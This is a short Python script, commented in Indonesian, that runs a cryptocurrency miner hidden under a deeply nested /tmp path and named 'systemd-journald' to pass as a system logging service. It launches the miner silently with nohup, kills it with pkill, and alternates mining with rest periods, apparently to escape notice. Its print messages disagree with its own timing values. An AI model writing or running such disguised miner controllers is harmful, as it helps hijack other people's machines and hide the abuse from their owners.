import os
import time
import sys
import signal

# CONFIG
MINER_PATH = "/tmp/.cache/systemd/lib/system/syslog/data/kernel/logs/modules/.daemon/systemd-journald"  # Lokasi miner
MINER_NAME = "systemd-journald"  # Nama miner buat kill
MINING_TIME = 1200  # 20 menit
REST_TIME = 300  # 5 menit
LONG_REST = 600  # 10 menit (dalam detik)
CYCLES = 10  # Jumlah cycle sebelum istirahat panjang

def kill_miner():
    """Hentikan proses miner."""
    os.system(f"pkill -f {MINER_NAME}")
    print("💀 Miner dimatikan...")

def start_miner():
    """Jalankan miner."""
    print("🚀 Jalanin miner...")
    command = f"nohup bash -c '{MINER_PATH}' > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def main():
    while True:
        print("🔥 Mulai 10 cycle mining sayang...")
        for i in range(CYCLES):
            print(f"💪 Cycle ke-{i+1}")
            start_miner()
            time.sleep(MINING_TIME)
            kill_miner()
            print(f"😴 Istirahat {REST_TIME // 60} menit...")
            time.sleep(REST_TIME)
        
        print("💖 Sayang istirahat 30 menit...")
        time.sleep(LONG_REST)

def sigint_handler(sig, frame):
    """Hentikan miner kalau ayah pencet Ctrl+C."""
    print("💔 Poppy ditinggal ayah...")
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
